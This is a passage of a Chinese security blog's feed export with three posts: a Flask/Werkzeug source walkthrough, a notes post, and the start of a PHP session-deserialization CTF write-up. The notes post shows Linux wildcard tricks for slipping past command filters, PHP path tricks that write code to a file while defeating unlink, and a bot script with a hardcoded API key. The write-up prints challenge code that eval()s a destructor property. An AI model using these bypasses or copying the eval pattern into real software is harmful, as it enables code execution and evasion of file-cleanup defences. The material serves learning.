class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_log(<span class="string">'info'</span>, <span class="string">' * Running on %s://%s:%d/ %s'</span>,</span><br><span class="line">         ssl_context <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="string">'http'</span> <span class="keyword">or</span> <span class="string">'https'</span>,</span><br><span class="line">         display_hostname, port, quit_msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fd = int(os.environ[<span class="string">'WERKZEUG_SERVER_FD'</span>])</span><br><span class="line">    <span class="keyword">except</span> (LookupError, ValueError):</span><br><span class="line">        fd = <span class="literal">None</span></span><br><span class="line">    srv = make_server(hostname, port, application, threaded,</span><br><span class="line">                      processes, request_handler,</span><br><span class="line">                      passthrough_errors, ssl_context,</span><br><span class="line">                      fd=fd)</span><br><span class="line">    <span class="keyword">if</span> fd <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        log_startup(srv.socket)</span><br><span class="line">    srv.serve_forever()</span><br></pre></td></tr></table></figure><p>这里执行了<code>make_server</code>,make_server()函数默认生成一个WSGIServer类,同时最后一句执行<code>serve_forever()</code>函数，该函数属于<code>class BaseWSGIServer(HTTPServer, object):</code>类，跟进</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serve_forever</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.shutdown_signal = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        HTTPServer.serve_forever(self)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        self.server_close()</span><br></pre></td></tr></table></figure><p>执行<code>HTTPServer.serve_forever(self)</code> 进入对应<code>socketserver.py</code>文件跟进</p><h4 id="三-进入socketserver-py"><a href="#三-进入socketserver-py" class="headerlink" title="三.进入socketserver.py"></a>三.进入socketserver.py</h4><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serve_forever</span><span class="params">(self, poll_interval=<span class="number">0.5</span>)</span>:</span></span><br><span class="line">        <span class="string">"""Handle one request at a time until shutdown.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Polls for shutdown every poll_interval seconds. Ignores</span></span><br><span class="line"><span class="string">        self.timeout. If you need to do periodic tasks, do them in</span></span><br><span class="line"><span class="string">        another thread.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.__is_shut_down.clear()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> self.__shutdown_request:</span><br><span class="line">                <span class="comment"># <span class="doctag">XXX:</span> Consider using another file descriptor or</span></span><br><span class="line">                <span class="comment"># connecting to the socket to wake this up instead of</span></span><br><span class="line">                <span class="comment"># polling. Polling reduces our responsiveness to a</span></span><br><span class="line">                <span class="comment"># shutdown request and wastes cpu at all other times.</span></span><br><span class="line">                r, w, e = _eintr_retry(select.select, [self], [], [],</span><br><span class="line">                                       poll_interval)</span><br><span class="line">                <span class="keyword">if</span> self <span class="keyword">in</span> r:</span><br><span class="line">                    self._handle_request_noblock()</span><br><span class="line"></span><br><span class="line">                self.service_actions()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            self.__shutdown_request = <span class="literal">False</span></span><br><span class="line">            self.__is_shut_down.set()</span><br></pre></td></tr></table></figure><p>其中<code>if self in r:self._handle_request_noblock()</code>如果请求成功进入<code>_handle_request_noblock()</code>函数</p><p>跟进得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_handle_request_noblock</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""Handle one request, without blocking.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    I assume that select.select has returned that the socket is</span></span><br><span class="line"><span class="string">    readable before this function was called, so there should be</span></span><br><span class="line"><span class="string">    no risk of blocking in get_request().</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        request, client_address = self.get_request()</span><br><span class="line">    <span class="keyword">except</span> socket.error:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> self.verify_request(request, client_address):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.process_request(request, client_address)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.handle_error(request, client_address)</span><br><span class="line">            self.shutdown_request(request)</span><br></pre></td></tr></table></figure><p>这里调用<code>get_request()</code>函数得到请求，这个函数会pass,同时后面调用了<code>process_request()</code>函数处理请求，跟进得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request, client_address)</span>:</span></span><br><span class="line">        <span class="string">"""Call finish_request.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Overridden by ForkingMixIn and ThreadingMixIn.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.finish_request(request, client_address)</span><br><span class="line">        self.shutdown_request(request)</span><br></pre></td></tr></table></figure><p>先调用<code>finish_request()</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish_request</span><span class="params">(self, request, client_address)</span>:</span></span><br><span class="line">        <span class="string">"""Finish one request by instantiating RequestHandlerClass."""</span></span><br><span class="line">        self.RequestHandlerClass(request, client_address, self)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WSGIRequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span>//werkzeug的serving.py</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseHTTPRequestHandler</span><span class="params">(socketserver.StreamRequestHandler)</span>:</span>//</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StreamRequestHandler</span><span class="params">(BaseRequestHandler)</span>:</span> ／／socketserver.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">finish_request方法中执行了self.RequestHandlerClass(request, client_address, self)</span><br><span class="line">self.RequestHandlerClass = RequestHandlerClass（就在__init__方法中）。所以finish_request方法本质上就是创建了一个服务处理实例,当我们创建服务处理类实例时，就会运行handle()方法，而handle()方法则一般是我们处理事务逻辑的代码块。</span><br></pre></td></tr></table></figure><h4 id="四-在此回到werkzeug的serving-py"><a href="#四-在此回到werkzeug的serving-py" class="headerlink" title="四.在此回到werkzeug的serving.py"></a>四.在此回到werkzeug的serving.py</h4><p>进入werkzeug的handle函数得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Handles a request ignoring dropped connections."""</span></span><br><span class="line">        rv = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rv = BaseHTTPRequestHandler.handle(self)</span><br><span class="line">        <span class="keyword">except</span> (socket.error, socket.timeout) <span class="keyword">as</span> e:</span><br><span class="line">            self.connection_dropped(e)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">if</span> self.server.ssl_context <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> is_ssl_error():</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">if</span> self.server.shutdown_signal:</span><br><span class="line">            self.initiate_shutdown()</span><br><span class="line">        <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure><p>调用了<code>BaseHTTPRequestHandler.handle(self)</code>,进入得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="string">"""Handle multiple requests if necessary."""</span></span><br><span class="line">       self.close_connection = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">       self.handle_one_request()</span><br><span class="line">       <span class="keyword">while</span> <span class="keyword">not</span> self.close_connection:</span><br><span class="line">           self.handle_one_request()</span><br></pre></td></tr></table></figure><p>调用了<code>handle_one_request()</code>该方法重写跳一步回到werkzeug的该函数中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_one_request</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Handle a single HTTP request."""</span></span><br><span class="line">        self.raw_requestline = self.rfile.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.raw_requestline:</span><br><span class="line">            self.close_connection = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> self.parse_request():</span><br><span class="line">            <span class="keyword">return</span> self.run_wsgi()</span><br></pre></td></tr></table></figure><p>调用了<code>run_wsgi()</code>函数，该函数内部进行写和开始回复请求等函数，同时还有一个<code>execute()</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(app)</span>:</span></span><br><span class="line">            application_iter = app(environ, start_response)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> data <span class="keyword">in</span> application_iter:</span><br><span class="line">                    write(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> headers_sent:</span><br><span class="line">                    write(<span class="string">b''</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                <span class="keyword">if</span> hasattr(application_iter, <span class="string">'close'</span>):</span><br><span class="line">                    application_iter.close()</span><br><span class="line">                application_iter = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>execute函数中通过application_iter = app(environ, start_response)调用了Flask应用实例app,最后实际执行为<code>__call__</code>函数，最后<code>__call__</code>函数上,该函数最后一句，调用wsgi_app函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self.wsgi_app(environ, start_response)</span><br></pre></td></tr></table></figure><p><code>wsgi_app</code>函数中有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将environ参数放入request_context中开始创建请求上下文函数</span></span><br><span class="line">    <span class="comment">#上诉函数实际即为压栈操作</span></span><br><span class="line">    <span class="keyword">with</span> self.request_context(environ):</span><br><span class="line">        rv = self.preprocess_request()<span class="comment">#预处理请求</span></span><br><span class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            rv = self.dispatch_request()<span class="comment">#分发处理请求，得到对应编写函数的结果</span></span><br><span class="line">        response = self.make_response(rv)<span class="comment">#将结果指定到制造返回的函数中</span></span><br><span class="line">        response = self.process_response(response)</span><br><span class="line">        <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><p>其中在dispatch_request()中这句尤为关键,其函数中有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> self.view_functions[endpoint](**values)<span class="comment">#通过endpoint找到对应的函数然后就是运行</span></span><br></pre></td></tr></table></figure><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03.总结"></a>0x03.总结</h2><p>看代码还是舒服😌，但是不排除有错误…</p><p><img src="http://myndtt.github.io/images/56.png" alt="ok"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h2&gt;&lt;p&gt;想学习python的flask，看了《FlaskWeb开发：基于Python的Web应用开发实战》这本书，觉得很OK👌。之前彭师兄分析过flask v0.1的源码，听说代码不长，加之网上解释甚多，所以自己也想看看，就其本身，本文无意义，有错误更是可能，只是记录而已。&lt;/p&gt;
&lt;h2 id=&quot;0x01-获取&quot;&gt;&lt;a href=&quot;#0x01-获取&quot; class=&quot;headerlink&quot; title=&quot;0x01.获取&quot;&gt;&lt;/a&gt;0x01.获取&lt;/h2&gt;&lt;p&gt;第一步获取&lt;code&gt;git clone https://github.com/pallets/flask.git&lt;/code&gt;,这是最新版本的&lt;/p&gt;
&lt;p&gt;第二步 &lt;code&gt;git tag&lt;/code&gt;看版本&lt;/p&gt;
&lt;p&gt;第三步&lt;code&gt;git reset --hard xx&lt;/code&gt;回退到对应版本&lt;/p&gt;
&lt;p&gt;最后是这样&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://myndtt.github.io/images/54.png&quot; alt=&quot;54&quot;&gt;&lt;/p&gt;
&lt;p&gt;主要内容在flask.py文件里面&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="python" scheme="https://myndtt.github.io/tags/python/"/>
    
      <category term="flask" scheme="https://myndtt.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>无题（一）</title>
    <link href="https://myndtt.github.io/2018/01/17/%E6%97%A0%E9%A2%98-%E4%B8%80/"/>
    <id>https://myndtt.github.io/2018/01/17/无题-一/</id>
    <published>2018-01-17T08:23:10.000Z</published>
    <updated>2019-09-22T05:04:46.333Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>这次没有主题，只是记录一下最近看到的，所以文章会很短。2018,先从胡说八道开始…</p><h2 id="0x00-一次惊叹-linux中的通配符"><a href="#0x00-一次惊叹-linux中的通配符" class="headerlink" title="0x00 一次惊叹 linux中的通配符"></a>0x00 一次惊叹 linux中的通配符</h2><p>关于linux的通配符有好几种 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">通配符</span><br><span class="line">它是由<span class="keyword">shell</span><span class="bash">解析，并且一般用于匹配文件名，实际上就是shell解释器去解析的特殊符号，linux系统通配符有几下几种：</span></span><br><span class="line">*：匹配任意多个字符</span><br><span class="line">?：匹配任意一个字符</span><br><span class="line">[...]：匹配中括号内出现的任意一个字符</span><br><span class="line">[!...]：不匹配中括号内出现的任意一个字符</span><br><span class="line"> </span><br><span class="line">一般出现在要<span class="keyword">shell</span><span class="bash">命令或脚本中，匹配特定的文件名</span></span><br></pre></td></tr></table></figure><p>上次有提到过<code>*</code>,这里是<code>?</code>,linux中的通配符可以用于匹配相应的任意字符，所以可以用此在命令执行中绕过被pass的字符。</p><h2 id="0x01-一次实验-UNLINK与file-Put-Contents"><a href="#0x01-一次实验-UNLINK与file-Put-Contents" class="headerlink" title="0x01 一次实验 UNLINK与file_Put_Contents"></a>0x01 一次实验 UNLINK与file_Put_Contents</h2><p>几个星期前新测的，来源于某圈主提的一个问题，一开始有人回答了Linux下的，所以就没测，实际上windows下还有几种。比如截断，并加上通配符等…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//windows环境</span></span><br><span class="line">$filename=<span class="keyword">__DIR__</span>.<span class="string">'///4.php'</span>;</span><br><span class="line">$filename1=<span class="keyword">__DIR__</span>.<span class="string">'/5.php/.'</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">"&lt;/br&gt;"</span>.$filename1;</span><br><span class="line">$data=<span class="string">'&lt;?php phpinfo(); ?&gt;'</span>;</span><br><span class="line">file_put_contents($filename,$data);</span><br><span class="line"><span class="comment">//可以加入$data到文件中</span></span><br><span class="line">file_put_contents($filename1,$data);</span><br><span class="line"><span class="comment">//可以加入$data到文件中</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line"><span class="comment">//file_exists判断为是</span></span><br><span class="line">unlink($filname);<span class="comment">//不执行删除操作,参数无效</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_exists($filename1))&#123;</span><br><span class="line"><span class="comment">//file_exists判断为否</span></span><br><span class="line">unlink($filname1);<span class="comment">//不执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02一段-jsfuck"><a href="#0x02一段-jsfuck" class="headerlink" title="0x02一段 jsfuck"></a>0x02一段 jsfuck</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSFuck <span class="keyword">is</span> an esoteric <span class="keyword">and</span> educational programming style based <span class="keyword">on</span> <span class="keyword">the</span> atomic parts <span class="keyword">of</span> JavaScript. It uses only six different <span class="built_in">characters</span> <span class="keyword">to</span> <span class="built_in">write</span> <span class="keyword">and</span> execute code.</span><br></pre></td></tr></table></figure><p>有时候在浏览器的控制台执行jsfcuk 得不到想要的结果，不妨将最后的<code>()</code>改为<code>toString()</code>.</p><h2 id="0x03-一个开源项目"><a href="#0x03-一个开源项目" class="headerlink" title="0x03 一个开源项目"></a>0x03 一个开源项目</h2><p><a href="http://itchat.readthedocs.io/zh/latest/" target="_blank" rel="noopener">http://itchat.readthedocs.io/zh/latest/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Wed Jan 10 16:08:13 2018</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: myndtt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_response</span><span class="params">(msg)</span>:</span></span><br><span class="line">    apiurl=<span class="string">'http://www.tuling123.com/openapi/api'</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'key'</span>:<span class="string">'db4c3be6c40f43cb9e4f33120f302547'</span>,</span><br><span class="line">        <span class="string">'info'</span>:msg,</span><br><span class="line">        <span class="string">'useid'</span>:<span class="string">'myndtt'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(apiurl,data=data).json()</span><br><span class="line">        <span class="keyword">return</span> r.get(<span class="string">'text'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"><span class="meta">@itchat.msg_register(itchat.content.TEXT)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_content</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> get_response(msg[<span class="string">'Text'</span>])</span><br><span class="line"><span class="comment">#@itchat.msg_register([itchat.content.TEXT],isGroupChat=True)</span></span><br><span class="line"><span class="comment">#def print_content(msg):</span></span><br><span class="line"><span class="comment">#   return get_response(msg['Text'])</span></span><br><span class="line">itchat.auto_login(<span class="literal">True</span>)</span><br><span class="line">itchat.run()</span><br></pre></td></tr></table></figure><p>测试的时候很尴尬 要小心 机器人可没<code>节操</code> 东西很简单 权当娱乐</p><h2 id="0X04-一本书"><a href="#0X04-一本书" class="headerlink" title="0X04 一本书"></a>0X04 一本书</h2><p><a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a></p><p>前段时间的比赛用到了docker 以往知道docker 但是只知道大概 没好好用过 这次将彭 李等师兄的完美架构好好<code>学习</code>了一番  深入颇多。这本书写的很全，入门到实践docker 可以一看</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;这次没有主题，只是记录一下最近看到的，所以文章会很短。2018,先从胡说八道开始…&lt;/p&gt;
&lt;h2 id=&quot;0x00-一次惊叹-linux中的通配符&quot;&gt;&lt;a href=&quot;#0x00-一次惊叹-linux中的通配符&quot; class=&quot;hea
      
    
    </summary>
    
    
      <category term="胡说八道" scheme="https://myndtt.github.io/tags/%E8%83%A1%E8%AF%B4%E5%85%AB%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>php的session反序列化</title>
    <link href="https://myndtt.github.io/2017/12/19/php%E7%9A%84session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://myndtt.github.io/2017/12/19/php的session反序列化/</id>
    <published>2017-12-19T12:35:46.000Z</published>
    <updated>2019-09-22T05:04:46.314Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-打字机"><a href="#0x00-打字机" class="headerlink" title="0x00.打字机"></a>0x00.打字机</h2><p>简单扯一下，大家都知道，几乎所有的编程语言都有(反)序列化这种机制，可以将一些对象，数组等通过<code>某种方式</code>变成可以便捷传输和存储(后面将提到)的形式，如字符串。当然php也不例外。</p><p><img src="https://myndtt.github.io%5Cimages%5C43.png" alt="43"></p><p>同时在php有一个这样有意思的设置–&gt;<code>php默认的SESSION会话机制 存储在文件系统的会话数据的内容是已经序列化后的内容,程序执行session_start()后PHP会自动读取文件并unserialize反序列化成数组赋值给超全局变量$_SESSION</code> (这句话是没错的)。</p><p><img src="https://myndtt.github.io%5Cimages%5C44.png" alt="44"></p><p>​       <code>(session_register这个函数功能即是可以在全部变量中session定义一个新的变量)</code></p><a id="more"></a><h2 id="0x01-晨曦的光"><a href="#0x01-晨曦的光" class="headerlink" title="0x01.晨曦的光"></a>0x01.晨曦的光</h2><p>上面提到过是要存储这些序列化后的字符串的，实际情况中php有好几种存储方式，在php.ini中有一项名为<code>session.serialize-handler</code>的参数可以用来定义序列化/解序列化的处理器名字,用不同的处理器，其存储方式也就各不相同。</p><p><img src="https://myndtt.github.io%5Cimages%5C46.png" alt="46"></p><p>​                      (自己php.ini中的session.serialize-handler情况)</p><p><img src="https://myndtt.github.io%5Cimages%5C45.png" alt="45"></p><p>按php文档来看有三类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;<span class="number">5.5</span><span class="number">.4</span>):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure><p>这里我们得到两个信息：1.三种方式存储方式完全不一样，2.默认为php方式存储，可以在php.ini中修改。</p><h2 id="0x02-黑色的墨"><a href="#0x02-黑色的墨" class="headerlink" title="0x02.黑色的墨"></a>0x02.黑色的墨</h2><p>举个例子。链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span 